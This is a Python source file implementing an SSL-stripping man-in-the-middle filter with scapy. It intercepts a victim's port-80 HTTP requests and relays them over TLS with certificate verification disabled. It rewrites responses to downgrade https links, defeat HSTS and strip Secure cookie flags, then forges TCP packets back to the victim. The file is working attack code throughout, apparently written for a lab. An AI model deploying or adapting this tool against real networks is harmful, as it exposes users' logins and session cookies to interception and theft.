import socket
import re
import ssl
import threading
from scapy.layers.inet import IP, TCP

class SSLStripFilter:
    """
    A Proxy-based SSL stripping filter.
    Intercepts victim HTTP requests on Port 80.
    Proxies them via HTTPS to the server.
    Returns the plaintext response to the victim.
    """

    def __init__(self, victim_ip, logger):
        self.victim_ip = victim_ip
        self.logger = logger
        # Cache for checking if we should hijack a session
        self.hijacked_ports = set()
        self.processed_requests = set()

    def __call__(self, packet):
        if not packet.haslayer(TCP):
            return False

        ip = packet[IP]
        tcp = packet[TCP]
        
        # --- DEBUG LOGGING ---
        # Uncomment this to see ALL TCP traffic flows
        # if ip.src == self.victim_ip:
        #    print(f"[DEBUG] Traffic from Victim: Dport={tcp.dport} Len={len(tcp.payload)}")
        # ---------------------

        # 1. Traffic FROM Victim TO Server (Port 80) - The Request
        if ip.src == self.victim_ip and tcp.dport == 80:
            if len(tcp.payload) > 0:
                print(f"[DEBUG] Saw HTTP Payload from Victim. Length: {len(tcp.payload)}")
                # Check snippet of payload
                print(f"[DEBUG] Payload snippet: {bytes(tcp.payload)[:50]}")
                return self._handle_client_request(packet)
            else:
                 # Handshake packets (SYN, ACK) have 0 payload. We let them pass to establish connection with real server.
                 return False
            
        # 2. Traffic FROM Server TO Victim (Port 80)
        # If we successfully proxied, we blocked the real request, so the real server 
        # never replies on port 80 (or we don't care about it).
        # We need to block real server responses if they leak through to avoid duplicates.
        if ip.dst == self.victim_ip and tcp.sport == 80:
             # If this is a response to a hijacked port, drop it (we already sent a fake response)
             # But actually, if we drop the request, the server never sees it, so no response.
             # However, if ACK packets flow, let them pass.
             if len(tcp.payload) > 0 and tcp.dport in self.hijacked_ports:
                 return True # Drop real server responses if any

        return False

    def _handle_client_request(self, packet):
        """
        Intercepts HTTP GET/POST, sends it to Server over SSL, 
        gets response, rewrites it, sends back to Client.
        """
        ip = packet[IP]
        tcp = packet[TCP]
        payload = bytes(tcp.payload)

        # Unique ID for this request to prevent handling retransmissions
        # (SrcIP, SrPort, DstIP, SeqNum)
        request_id = (ip.src, tcp.sport, ip.dst, tcp.seq)
        if request_id in self.processed_requests:
            return True # Drop retransmissions silently
        
        # Basic check for HTTP method
        if not (b"GET " in payload or b"POST " in payload):
            return False

        self.processed_requests.add(request_id)
        self.logger(f"[SSLFilter] Intercepting HTTP Request on port {tcp.sport}")
        self.hijacked_ports.add(tcp.sport)
        
        # Run in thread to not block the sniffer
        t = threading.Thread(target=self._proxy_job, args=(packet, payload))
        t.daemon = True
        t.start()

        # Drop the original packet so Server:80 doesn't get it (preventing redirect loop)
        return True

    def _proxy_job(self, packet, payload):
        ip = packet[IP]
        tcp = packet[TCP]
        server_ip = ip.dst
        
        try:
            # 1. Establish SSL Connection to Server
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE # We trust the self-signed cert of server for this attack
            
            # Increase timeout to 10s
            # Note: We connect to the IP directly to avoid DNS lookups
            with socket.create_connection((server_ip, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=server_ip) as ssock:
                    
                    # 2. Forward the Payload (Request)
                    # We need to ensure we send a valid HTTP request.
                    # Sometimes the payload captured has partial data or issues.
                    # Also, force "Connection: close" to ensure we don't hang waiting
                    if b"Connection: keep-alive" in payload:
                        payload = payload.replace(b"Connection: keep-alive", b"Connection: close     ")
                    
                    ssock.sendall(payload)
                    
                    # 3. Read Response
                    response_data = b""
                    while True:
                        try:
                            chunk = ssock.recv(4096)
                            if not chunk: break
                            response_data += chunk
                        except socket.timeout:
                            break
                        except Exception as e:
                            self.logger(f"[SSLFilter] Socket Read Error: {e}")
                            break

            if not response_data:
                self.logger("[SSLFilter] No data received from server?")
                return

            self.logger(f"[SSLFilter] Got {len(response_data)} bytes from server")

            # 4. Modify Response (Strip SSL)
            modified_data = self._rewrite_response(response_data)
            
            # 5. Send back to Victim
            self._send_spoofed_response(packet, modified_data)

        except Exception as e:
            self.logger(f"[SSLFilter] Proxy failed: {e}")


    def _rewrite_response(self, data):
        # Header stripping
        # 1. https:// -> http:// 
        data = data.replace(b"https://", b"http:// ")
        
        # 2. HSTS
        data = data.replace(b"Strict-Transport-Security", b"Stricken-Transport-Security")

        # 3. Secure Cookies (Strip 'Secure' flag)
        data = data.replace(b"; Secure", b"; Scurre")
        
        return data

    def _send_spoofed_response(self, request_packet, response_payload):
        ip = request_packet[IP]
        tcp = request_packet[TCP]
        import scapy.all as sc

        # Determine L2 Destination (MAC of Victim)
        ether_dst = "ff:ff:ff:ff:ff:ff"
        if request_packet.haslayer(sc.Ether):
             ether_dst = request_packet[sc.Ether].src

        # Current sequence numbers
        current_seq = tcp.ack
        current_ack = tcp.seq + len(request_packet[TCP].payload)
        
        # Split payload into chunks to fit within MTU
        # MTU 1500 - IP(20) - TCP(20) - Ethernet(14) ~ 1446 max payload
        # We use safe 1300 bytes
        CHUNK_SIZE = 1300
        
        total_sent = 0
        total_len = len(response_payload)
        
        while total_sent < total_len:
            # Get next chunk
            chunk = response_payload[total_sent : total_sent + CHUNK_SIZE]
            
            # Construct partial packet
            forged_pkt = (
                sc.Ether(dst=ether_dst) /
                IP(src=ip.dst, dst=ip.src) /
                TCP(sport=tcp.dport, dport=tcp.sport,
                    seq=current_seq + total_sent, 
                    ack=current_ack,
                    flags="PA") / # PSH, ACK
                chunk
            )
            
            try:
                sc.sendp(forged_pkt, verbose=False)
            except Exception as e:
                self.logger(f"[SSLFilter] Failed sending chunk: {e}")
                
            total_sent += len(chunk)

        self.logger(f"[SSLFilter] Sent spoofed response ({total_len} bytes in {int(total_len/CHUNK_SIZE)+1} chunks)")


